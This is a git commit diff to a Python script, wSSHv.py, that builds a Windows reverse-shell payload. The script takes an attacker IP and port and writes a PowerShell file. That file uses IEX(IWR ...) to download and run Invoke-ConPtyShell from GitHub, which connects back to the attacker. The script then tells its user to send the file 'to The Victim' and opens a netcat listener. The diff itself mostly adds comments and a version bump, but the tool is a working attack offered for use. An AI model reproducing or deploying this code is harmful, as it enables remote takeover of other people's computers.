65b472f64718d3d503f11f8f85abe184d0fce71c
NOPChunk <85025297+NOPChunk@users.noreply.github.com>
2021-07-15 13:26:00 -0400

    updated
    Fixed future!

--- wSSHv.py
+++ wSSHv.py
@@ -2,30 +2,37 @@
 
 import subprocess
 
+# Created by Emad, my YouTube-Channel: Networkchunk.
+# Version 1.0.1. 
+
 # Welcome message!
 print("""
                   < This tool been designd for YOU >
                               ___ ___ _  _     
                      __ __ __/ __/ __| || |_ __
                      \ V  V /\__ \__ \ __ \ V /
-                      \_/\_/ |___/___/_||_|\_/ 1.0.0
+                      \_/\_/ |___/___/_||_|\_/ 1.0.1
         
        < Enter the Following Steps! To Create PowerShell File >
     """)
 
-# input for ip and port!
+# Input ip and port!
 ip_to_connect = input("Enter your IP --> ")
 port_to_open = input("Enter any PORT --> ")
+
+# Creating PowerShell file with following user Input!
 subprocess.getoutput("echo 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPty"
                       "Shell.ps1 -UseBasicParsing); Invoke-ConPtyShell " + ip_to_connect + " " + port_to_open + "' >> wSSHv.ps1")
 
-# creating PowerShell file and start listening session messages!
+# A message that (wSSHv.ps1) file been created!
 print("\n[*] A File Has Been Created and Ready to Send it to The Victim!\n[*] Press Enter to start the listening..")
 
-# calling netcat and filling out the user input to be ready for SSH listening session!
+# Changing the style to be suitable as WinOS CMD before calling the listening session!
 command = 'stty raw -echo; (stty size; cat) | nc -lvnp'
 ret = subprocess.run(command, capture_output=True, shell=True)
 print(ret.stdout.decode())
 
+# Calling netcat to start the listening session!
 subprocess.call(["nc", "-lvnp", port_to_open, "-s", ip_to_connect])
 
+# User could modifie this tool to be more usefull for his porpose !
